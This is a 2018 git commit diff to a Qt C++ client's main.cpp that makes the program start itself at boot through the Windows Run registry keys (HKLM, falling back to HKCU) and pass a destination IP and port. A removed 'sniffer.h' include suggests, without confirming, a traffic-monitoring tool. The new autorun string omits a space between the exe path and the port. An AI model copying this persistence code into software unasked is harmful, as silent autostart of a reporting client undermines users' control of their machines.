177b5e14f0f85aeac132d1aa1d8032ce1b807980
Gorillaz Dj <djg2008@gmail.com>
2018-07-26 01:47:57 +0300

    Fix client autorun
    - Fix registry path value
    - Duplicate autorun settings is now deleted

--- src/client/main.cpp
+++ src/client/main.cpp
@@ -1,33 +1,36 @@
-#include "sniffer.h"
 #include "client.h"
 
 #include <QApplication>
 #include <QSettings>
 #include <QProcess>
 
-void setAutorun(const QApplication& app, const QString& appPath, const quint16& localPort, const QString& ip, const quint16& destPort)
+void setAutorun(const QApplication& app, const quint16& localPort, const QString& ip, const quint16& destPort)
 {
     //Path to exe and parameters
-    QString path = QDir::toNativeSeparators(app.applicationFilePath()) + " \""+
-                  appPath + "\" " +
+    QString path = QDir::toNativeSeparators(app.applicationFilePath()) +
                   QString::number(localPort) + " " +
                   ip + " " +
                   QString::number(destPort);
 
     QSettings adminSettings("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);
+    QSettings userSettings("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);
+
+    //Write to registry
     adminSettings.setValue("client", path);
     adminSettings.sync();
 
-    //If user doesn't have admin rigths
-    if (adminSettings.status() != QSettings::NoError)
+    if(adminSettings.status() == QSettings::NoError)
     {
-        //If HKLM contains autorun key
-        if (adminSettings.contains("client"))
+        //Delete duplicate
+        userSettings.remove("client");
+    }
+    else //User doesn't have admin rights
+    {
+        //Check if autorun key already exists
+        if (adminSettings.value("client", "").toString() == path)
             return;
 
-        QSettings userSettings("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);
         userSettings.setValue("client", path);
-        userSettings.sync();
     }
 }
 
@@ -36,39 +39,37 @@ int main(int argc, char *argv[])
     try
     {
         QApplication app(argc, argv);
-        Client* client1;
+        Client* client;
 
         //Get command line arguments
         if (argc <= 2)
         {
             //Default parameters
-            client1 = new Client(&app, app.applicationDirPath(), 1234, "127.0.0.1", 12345);
-            setAutorun(app, app.applicationDirPath(), 1234, "127.0.0.1", 12345);
+            client = new Client(&app, app.applicationDirPath(), 1234, "127.0.0.1", 12345);
+            setAutorun(app, 1234, "127.0.0.1", 12345);
         }
         else if (argc == 3)
         {
             //Set destination ip + port
-            client1 = new Client(&app, app.applicationDirPath(), 1234, argv[1], QString(argv[2]).toInt());
-            setAutorun(app, app.applicationDirPath(), 1234, argv[1], QString(argv[2]).toInt());
+            client = new Client(&app, app.applicationDirPath(), 1234, argv[1], QString(argv[2]).toInt());
+            setAutorun(app, 1234, argv[1], QString(argv[2]).toInt());
         }
         else if (argc == 4)
         {
             //Set path + destination ip + port
             QDir dir;
             dir.mkpath(argv[1]);
-            client1 = new Client(&app, argv[1], 1234, argv[2], QString(argv[3]).toInt());
-            setAutorun(app, argv[1], 1234, argv[2], QString(argv[3]).toInt());
+            client = new Client(&app, argv[1], 1234, argv[2], QString(argv[3]).toInt());
+            setAutorun(app, 1234, argv[2], QString(argv[3]).toInt());
         }
         else if (argc > 4)
         {
             //Set path + local port + destination ip + port
             QDir dir;
             dir.mkpath(argv[1]);
-            client1 = new Client(&app, argv[1], QString(argv[2]).toInt(), argv[3], QString(argv[4]).toInt());
-            setAutorun(app, argv[1], QString(argv[2]).toInt(), argv[3], QString(argv[4]).toInt());
+            client = new Client(&app, argv[1], QString(argv[2]).toInt(), argv[3], QString(argv[4]).toInt());
+            setAutorun(app, QString(argv[2]).toInt(), argv[3], QString(argv[4]).toInt());
         }
-
-        QObject::connect(&app, &QCoreApplication::aboutToQuit, client1, &Client::deleteLater);
 
         return app.exec();
     }
